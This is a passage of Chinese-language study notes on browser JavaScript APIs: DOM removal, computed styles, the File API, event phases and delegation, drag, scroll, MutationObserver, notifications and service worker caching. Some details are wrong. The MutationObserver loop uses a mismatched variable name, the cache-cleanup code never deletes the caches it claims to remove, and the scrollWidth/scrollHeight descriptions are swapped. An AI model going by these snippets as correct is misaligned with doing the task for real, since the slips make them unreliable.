const self = document.getElementById('to-be-removed');
// 拿到父节点:
const parent = self.parentElement;
// 删除:
const removed = parent.removeChild(self);
removed === self; // true
```

### 获取样式

Window.getComputedStyle()：只读，

```js
const style = window.getComputedStyle(element, [pseudoElt]);
```

element：用于获取计算样式的 Element
pseudoElt：可选。指定一个要匹配的伪元素的字符串。必须对普通元素省略（或 null）。

返回的样式是一个实时的[`CSSStyleDeclaration`](https://developer.mozilla.org/zh-CN/docs/Web/API/CSSStyleDeclaration) 对象，当元素的样式更改时，它会自动更新本身。

获取元素的高度：

```js
document.getElementById('button').onclick = function () {
  const oStyle = window.getComputedStyle(this, null);
  alert(oStyle.height);
};
```

### File Api

由于 JavaScript 对用户上传的文件操作非常有限，尤其是无法读取文件内容，使得很多需要操作文件的网页不得不用 Flash 这样的第三方插件来实现。
随着 HTML5 的普及，新增的 File API 允许 JavaScript 读取文件内容，获得更多的文件信息。
HTML5 的 File API 提供了`File`和`FileReader`两个主要对象，可以获得文件信息并读取文件。
下面的例子演示了如何读取用户选取的图片文件，并在一个 `<div>` 中预览图像：

```js
const fileInput = document.getElementById('test-image-file'),
  info = document.getElementById('test-file-info'),
  preview = document.getElementById('test-image-preview');
// 监听change事件:
fileInput.addEventListener('change', () => {
  // 清除背景图片:
  preview.style.backgroundImage = '';
  // 检查文件是否选择:
  if (!fileInput.value) {
    info.innerHTML = '没有选择文件';
    return;
  }
  // 获取File引用:
  const file = fileInput.files[0];
  // 获取File信息:
  info.innerHTML =
    `文件: ${file.name}<br>` +
    `大小: ${file.size}<br>` +
    `修改: ${file.lastModifiedDate}`;
  if (
    file.type !== 'image/jpeg' &&
    file.type !== 'image/png' &&
    file.type !== 'image/gif'
  ) {
    alert('不是有效的图片文件!');
    return;
  }
  // 读取文件:
  const reader = new FileReader();
  // 以DataURL的形式读取文件:
  reader.readAsDataURL(file);
  // 监听读取文件完成
  reader.onload = function (e) {
    const data = e.target.result; // base64 编码
    preview.style.backgroundImage = `url(${data})`;
  };
});
```

上面的代码演示了如何通过 HTML5 的 File API 读取文件内容。以 DataURL 的形式读取到的文件是一个字符串，类似于 data:image/jpeg;base64,/9j/4AAQSk...(base64 编码)...，常用于设置图像。如果需要服务器端处理，把字符串 base64,后面的字符发送给服务器并用 Base64 解码就可以得到原始文件的二进制内容。

### 事件

- load
- error
- online / offline
- click
- contextmenu
- mouseover
- dblclick
- selectstart
- keydown/keypress

#### 事件的三个阶段

1. 事件的捕获阶段：在事件冒泡的模型中，捕获阶段不会响应任何事件
2. 事件的目标阶段（触发自己的事件）：目标阶段就是指事件响应到触发事件的最底层元素上
3. 冒泡阶段：就是事件的触发响应会从最底层目标一层层地向外到最外层（根节点）

事件代理即是利用事件冒泡的机制把里层所需要响应的事件绑定到外层；

在触发某个事件的时候，都会产生一个事件对象 Event，这个对象中包含所有与事件相关的一些信息，包括触发事件的元素，事件的类型以及其他与事件相关的信息。

鼠标事件触发时，事件对象中会包含鼠标的位置信息。

键盘事件触发时，事件对象中会包含按下的键相关的信息。

对于现代浏览器，获取事件对象非常的简单，只需要在注册事件的时候，指定一个形参即可。这个形参就是我们想要获取到的事件对象。

```js
btn.onclick = function (event) {
  //event就是事件对象，里面包含了事件触发时的一些信息。
  console.log(event);
};
```

对于 IE678 来说，获取事件对象则是另一种方式，在事件里面，通过 window.event 来获取事件对象

```js
btn.onclick = function () {
  //IE678通过window.event获取事件对象
  const event = window.event;
  console.log(event);
};
```

兼容性封装

```js
btn.onclick = function (event) {
  //只要用到了事件对象，就要记得处理浏览器兼容性
  event = event || window.event;
};
```

#### 事件委托

原理：事件冒泡，子元素触发事件时会冒泡给父元素

event.target||e.src.element 能找到触发事件的元素

**优点**

1. 减少内存消耗
2. 动态绑定事件

#### 阻止冒泡

event.stopPropagation();

### 阻止浏览器默认事件

event.preventDefault()；

该方法将通知 Web 浏览器不要执行与事件关联的默认动作（如果存在这样的动作）。例如，如果 type 属性是 "submit"，在事件传播的任意阶段可以调用任意的事件句柄，通过调用该方法，可以阻止提交表单。注意，如果 Event 对象的 cancelable 属性是 fasle，那么就没有默认动作，或者不能阻止默认动作。无论哪种情况，调用该方法都没有作用。

### drag

dragover 当拖拽元素停留在 目标元素上面的时候触发 (以鼠标为基准)
drop 扔下来, 当拖拽元素在 目标元素上面 松开鼠标的时候触发

draggable：设置为 true，元素就可以拖拽了

拖拽元素事件：事件对象为被拖拽元素

- dragstart,拖拽前触发
- drag,拖拽前、拖拽结束之间，连续触发
- dragend,拖拽结束触发

目标元素事件：事件对象为目标元素

- dragenter,进入目标元素触发，相当于 mouseover
- dragover,进入目标、离开目标之间，连续触发
- dragleave,离开目标元素触发，，相当于 mouseout
- drop,在目标元素上释放鼠标触发

### scroll

onscroll：一般给 window 而不是 document（浏览器兼容）

scrollWidth：获取盒子内容的高度（content+padding，如果 content 超出盒子也算在内）
scrollHeight：获取盒子内容的宽度（content+padding，如果 content 超出盒子也算在内）

scrollLeft：水平滚动条滚动的距离
scrollTop：垂直滚动条滚动的距离

window.pageXOffset：获取页面滚动距离特用
window.pageYOffset：获取页面滚动距离特用

### MutationObserver

提供了监视对 DOM tree 所做更改的能力。它被设计为旧的 [MutationEvent](https://developer.mozilla.org/en-US/docs/Web/API/MutationEvent) 功能的替代品，该功能是 DOM3 Events 规范的一部分。

```js
// Select the node that will be observed for mutations
const targetNode = document.getElementById('some-id');

// Options for the observer (which mutations to observe)
const config = { attributes: true, childList: true, subtree: true };

// Callback function to execute when mutations are observed
const callback = (mutationsList, observer) => {
  for (const mutation of mutationList) {
    if (mutation.type === 'childList') {
      console.log('A child node has been added or removed.');
    } else if (mutation.type === 'attributes') {
      console.log(`The ${mutation.attributeName} attribute was modified.`);
    }
  }
};

// Create an observer instance linked to the callback function
const observer = new MutationObserver(callback);

// Start observing the target node for configured mutations
observer.observe(targetNode, config);

// Later, you can stop observing
observer.disconnect();
```

### IntersectionObserver

提供了一种异步观察目标元素与其祖先元素或顶级文档视窗(viewport)交叉状态的方法。祖先元素与视窗(viewport)被称为根(root)。

### Web Components

#### Shadow DOM

是游离在 DOM 树之外的节点树，如 video

### [Notification](https://developer.mozilla.org/en-US/docs/Web/API/notification)

```js
function notifyMe() {
  if (!('Notification' in window)) {
    // Check if the browser supports notifications
    alert('This browser does not support desktop notification');
  } else if (Notification.permission === 'granted') {
    // Check whether notification permissions have already been granted;
    // if so, create a notification
    const notification = new Notification('Hi there!');
    // …
  } else if (Notification.permission !== 'denied') {
    // We need to ask the user for permission
    Notification.requestPermission().then((permission) => {
      // If the user accepts, let's create a notification
      if (permission === 'granted') {
        const notification = new Notification('Hi there!');
        // …
      }
    });
  }

  // At last, if the user has denied notifications, and you
  // want to be respectful there is no need to bother them anymore.
}
```

### [devicemotion](https://developer.mozilla.org/en-US/docs/Web/API/Window/devicemotion_event)

设备运动传感器数据

```js
addEventListener('devicemotion', (event) => {});

ondevicemotion = (event) => {};
```

### service worker

- 无法访问 DOM
- 通过 postMessage 通信
- 代码不会阻塞
- 设置缓存

> 出于安全问题的考虑，Service Worker 只能被使用在 https 或者本地环境下。

```js
navigator.serviceWorker
  .register('/sw.js')
  .then((registration) => {
    // 注册成功
    console.log('Service Worker 注册成功，作用域是: ', registration.scope);
  })
  .catch((err) => {
    // 注册失败
    console.log('Service Worker 注册失败: ', err);
  });
```

```js
// sw.js
// 打开缓存 sw_cache，添加文件
this.addEventListener('install', (event) => {
  console.log('install');
  // event.waitUntil 让 Service Worker 等待我们的缓存操作完成
  event.waitUntil(
    caches.open('sw_cache').then((cache) => {
      return cache.addAll(['/**.css', '/**.jpg', './**.js']).catch((error) => {
        console.log('资源缓存失败:', error);
      });
    })
  );
});

// 拦截请求并缓存
this.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((response) => {
      // 缓存中有对应的资源，直接返回
      if (response) {
        return response;
      } // 缓存中没有对应的资源，从网络获取
      return fetch(event.request).catch(() => {
        // 网络获取失败，返回离线页面
        return caches.match('/offline.html');
      });
    })
  );
});
```

当 Service Worker 文件有了改动，浏览器就会认为 Service Worker 有更新，然后就会开始更新整个缓存流程：

- 重新安装 Service Worker，然后在新的 Service Worker
- 激活

```js
this.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then((cacheNames) => {
      return Promise.all(
        cacheNames.filter((cacheName) => {
          // 如果这个缓存不是我们新创建的缓存，那么就把它删除
          return cacheName !== 'my-new-cache';
        })
      );
    })
  );
});
```

即使 Service Worker 已经更新了，用户看到的可能仍然是旧的页面内容。
这是因为，虽然新的 Service Worker 已经激活，但是旧的 Service Worker 控制的页面（也就是用户当前打开的页面）在用户关闭浏览器或者刷新页面之前，仍然会被旧的 Service Worker 控制。所以，如果你想让用户立即看到最新的内容，这里就需要处理一下。
常见的处理方法有两种：立即获取控制权，静默更新站点内容；页面上提示用户手动刷新以更新网站缓存。
这两种方式各有优缺点，你需要根据你的用户群体和你网站的特性来决定用哪种方案。下面我会简单介绍一下这两种方案，你可以根据需要自行选择。

```js
// 立即获取控制权
this.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

const self = this;

// 提示用户手动刷新页面
this.addEventListener('install', (event) => {
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  event.waitUntil(
    self.clients.matchAll().then((clients) => {
      clients.forEach((client) => {
        client.postMessage({ type: 'SW_UPDATED' });
      });
    })
  );
});
```
